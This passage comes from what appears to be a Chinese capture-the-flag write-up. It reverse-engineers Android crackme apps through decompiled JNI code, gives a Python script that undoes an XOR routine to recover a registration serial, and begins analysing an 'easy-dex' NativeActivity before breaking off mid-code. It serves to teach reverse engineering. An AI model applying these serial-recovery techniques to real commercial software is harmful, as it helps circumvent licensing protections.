a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, <span class="string">"com/gdufs/xman/MyApp"</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, <span class="string">"m"</span>, <span class="string">"I"</span>);</span><br><span class="line">  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);<span class="comment">// set m = val</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">saveSN</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> a2, jstring a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *env; <span class="comment">// r6</span></span><br><span class="line">  jstring str; <span class="comment">// r9</span></span><br><span class="line">  FILE *v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  _WORD *v11; <span class="comment">// r5</span></span><br><span class="line">  JNIEnv *v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span> *<span class="title">v14</span>;</span> <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *utf_string; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *data; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> len; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">char</span> val; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [sp+0h] [bp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+14h] [bp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+18h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  env = a1;</span><br><span class="line">  str = a3;</span><br><span class="line">  f = fopen(<span class="string">"/sdcard/reg.dat"</span>, <span class="string">"w+"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( f )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = &amp;v21;</span><br><span class="line">    v8 = <span class="string">"W3_arE_whO_we_ARE"</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *(_DWORD *)v8;</span><br><span class="line">      v8 += <span class="number">8</span>;</span><br><span class="line">      v10 = *((_DWORD *)v8 - <span class="number">1</span>);</span><br><span class="line">      *v7 = v9;</span><br><span class="line">      v7[<span class="number">1</span>] = v10;</span><br><span class="line">      v11 = v7 + <span class="number">2</span>;</span><br><span class="line">      v7 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != <span class="string">"E"</span> );</span><br><span class="line">    v12 = &amp;env-&gt;functions;</span><br><span class="line">    i = <span class="number">2016</span>;</span><br><span class="line">    *v11 = *(_WORD *)v8;</span><br><span class="line">    v14 = env-&gt;functions;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    utf_string = v14-&gt;GetStringUTFChars(v12, str, <span class="number">0</span>);</span><br><span class="line">    data = utf_string;</span><br><span class="line">    len = <span class="built_in">strlen</span>(utf_string);</span><br><span class="line">    <span class="keyword">while</span> ( j &lt; len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = (i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">        val = *(&amp;v23 + i - <span class="number">23</span>);                 <span class="comment">// &amp;v23 - 32 = &amp;"3_arE_whO_we_ARE"</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = (i + <span class="number">7</span>) % <span class="number">15</span>;</span><br><span class="line">        val = *(&amp;v23 + i - <span class="number">22</span>);                 <span class="comment">// &amp;v23 - 22 = &amp;"_arE_whO_we_ARE"</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        i = (i + <span class="number">3</span>) % <span class="number">13</span>;</span><br><span class="line">        val = *(&amp;v23 + i - <span class="number">21</span>);                 <span class="comment">// &amp;v23 - 21 = &amp;"arE_whO_we_ARE"</span></span><br><span class="line">      &#125;</span><br><span class="line">      tmp = *data;</span><br><span class="line">      ++j;</span><br><span class="line">      *((_BYTE *)++data - <span class="number">1</span>) = tmp ^ val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fputs</span>(utf_string, f);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v22 == _stack_chk_guard )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> j___android_log_print(<span class="number">3</span>, <span class="string">"com.gdufs.xman"</span>, &amp;unk_2DCA);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> j_fclose(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">work</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *env; <span class="comment">// r4</span></span><br><span class="line">  jint m; <span class="comment">// r0</span></span><br><span class="line">  _JNIEnv *env_1; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  env = a1;</span><br><span class="line">  initSN(a1);</span><br><span class="line">  m = getValue(env);</span><br><span class="line">  <span class="keyword">if</span> ( m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = m == <span class="number">1</span>;</span><br><span class="line">    env_1 = env;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v4 = &amp;unk_2E6B;                           <span class="comment">// [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v4 = &amp;unk_2E95;                           <span class="comment">// [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    env_1 = env;</span><br><span class="line">    v4 = &amp;unk_2E5B;                             <span class="comment">// [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]</span></span><br><span class="line">  &#125;</span><br><span class="line">  callWork(env_1, (<span class="keyword">int</span>)v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 getValue 就是获取 m 的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jint __<span class="function">fastcall <span class="title">getValue</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *v1; <span class="comment">// r4</span></span><br><span class="line">  jclass v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">jfieldID</span> *<span class="title">v4</span>;</span> <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, <span class="string">"com/gdufs/xman/MyApp"</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, <span class="string">"m"</span>, <span class="string">"I"</span>);</span><br><span class="line">  <span class="keyword">return</span> v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);<span class="comment">// get m's value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">callWork</span><span class="params">(_JNIEnv *a1, <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// r8</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// r4</span></span><br><span class="line">  jclass v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">jmethodID</span> *<span class="title">v6</span>;</span> <span class="comment">// r0</span></span><br><span class="line">  jobject v7; <span class="comment">// r7</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">jmethodID</span> *<span class="title">v8</span>;</span> <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">void</span> (*v9)(JNIEnv *, jobject, jmethodID, ...); <span class="comment">// r6</span></span><br><span class="line">  jstring v10; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a2;</span><br><span class="line">  env = a1;</span><br><span class="line">  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, <span class="string">"com/gdufs/xman/MainActivity"</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);</span><br><span class="line">  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, <span class="string">"work"</span>, <span class="string">"(Ljava/lang/String;)V"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = env-&gt;functions-&gt;CallVoidMethod;</span><br><span class="line">    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);</span><br><span class="line">    v9(&amp;env-&gt;functions, v7, v8, v10);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">ciphertext = <span class="string">'EoPAoY62@ElRD'</span></span><br><span class="line">key = <span class="string">'W3_arE_whO_we_ARE'</span></span><br><span class="line">i = <span class="number">2016</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">l = len(ciphertext)</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> j &lt; l:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        i = (i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">        val = ord(key[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> j % <span class="number">3</span> ==<span class="number">2</span>:</span><br><span class="line">        i = (i + <span class="number">7</span>) % <span class="number">15</span></span><br><span class="line">        val = ord(key[i + <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = (i + <span class="number">3</span>) % <span class="number">13</span></span><br><span class="line">        val = ord(key[i + <span class="number">3</span>])</span><br><span class="line">    result += chr(ord(ciphertext[j]) ^ val)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">android:versionCode</span>=<span class="string">"1"</span> <span class="attr">android:versionName</span>=<span class="string">"1.0"</span> <span class="attr">package</span>=<span class="string">"com.a.sample.findmydex"</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">"24"</span> <span class="attr">platformBuildVersionName</span>=<span class="string">"7.0"</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"19"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"24"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"false"</span> <span class="attr">android:fullBackupContent</span>=<span class="string">"false"</span> <span class="attr">android:hasCode</span>=<span class="string">"false"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">"0xa0"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:name</span>=<span class="string">"android.app.NativeActivity"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"android.app.lib_name"</span> <span class="attr">android:value</span>=<span class="string">"native"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.a.sample.findmydex.MainActivity"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.a.sample.findmydex.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看了一下 Java 只有一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    Placeholder() &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">ANativeActivity_onCreate</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">size_t</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> savedState; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">size_t</span> savedStateSize; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> activity; <span class="comment">// r0</span></span><br><span class="line">  __int64 v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">pthread_attr_t</span> attr; <span class="comment">// [sp+4h] [bp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  savedState = a2;</span><br><span class="line">  savedStateSize = a3;</span><br><span class="line">  activity = *a1;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">20</span>) = sub_3000;</span><br><span class="line">  *(_DWORD *)activity = sub_305A;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">4</span>) = sub_3062;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">8</span>) = sub_306A;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">12</span>) = sub_30BE;</span><br><span class="line">  HIDWORD(v7) = sub_30EE;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">16</span>) = sub_30C6;</span><br><span class="line">  LODWORD(v7) = sub_30DE;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">56</span>) = sub_30CE;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">60</span>) = sub_30D6;</span><br><span class="line">  *(_QWORD *)(activity + <span class="number">24</span>) = v7;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">40</span>) = sub_30F4;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">44</span>) = sub_30FC;</span><br><span class="line">  *(_DWORD *)(activity + <span class="number">48</span>) = sub_3102;</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x94</span>u);</span><br><span class="line">  _aeabi_memclr4();</span><br><span class="line">  *((_DWORD *)v8 + <span class="number">3</span>) = v3;</span><br><span class="line">  pthread_mutex_init((<span class="keyword">pthread_mutex_t</span> *)(v8 + <span class="number">64</span>), <span class="number">0</span>);</span><br><span class="line">  pthread_cond_init((<span class="keyword">pthread_cond_t</span> *)(v8 + <span class="number">68</span>), <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( savedState )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">malloc</span>(savedStateSize);</span><br><span class="line">    *((_DWORD *)v8 + <span class="number">5</span>) = v9;</span><br><span class="line">    *((_DWORD *)v8 + <span class="number">6</span>) = savedStateSize;</span><br><span class="line">    _aeabi_memcpy(v9, savedState, savedStateSize);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( pipe(&amp;attr.__align + <span class="number">6</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="keyword">int</span> *)_errno();</span><br><span class="line">    v11 = strerror(*v10);</span><br><span class="line">    _android_log_print(<span class="number">6</span>, <span class="string">"threaded_app"</span>, <span class="string">"could not create pipe: %s"</span>, v11);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_QWORD *)v8 + <span class="number">9</span>) = *((_QWORD *)&amp;attr.__align + <span class="number">3</span>);</span><br><span class="line">    pthread_attr_init(&amp;attr);</span><br><span class="line">    pthread_attr_setdetachstate(&amp;attr, <span class="number">1</span>);</span><br><span class="line">    pthread_create((<span class="keyword">pthread_t</span> *)v8 + <span class="number">20</span>, &amp;attr, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))android_app_entry, v8);</span><br><span class="line">    pthread_mutex_lock((<span class="keyword">pthread_mutex_t</span> *)(v8 + <span class="number">64</span>));</span><br><span class="line">    <span class="keyword">while</span> ( !*((_DWORD *)v8 + <span class="number">27</span>) )</span><br><span class="line">      pthread_cond_wait((<span class="keyword">pthread_cond_t</span> *)(v8 + <span class="number">68</span>), (<span class="keyword">pthread_mutex_t</span> *)(v8 + <span class="number">64</span>));</span><br><span class="line">    pthread_mutex_unlock((<span class="keyword">pthread_mutex_t</span> *)(v8 + <span class="number">64</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  v3[<span class="number">7</span>] = v8;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard - *(&amp;attr.__align + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">android_app_entry</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span 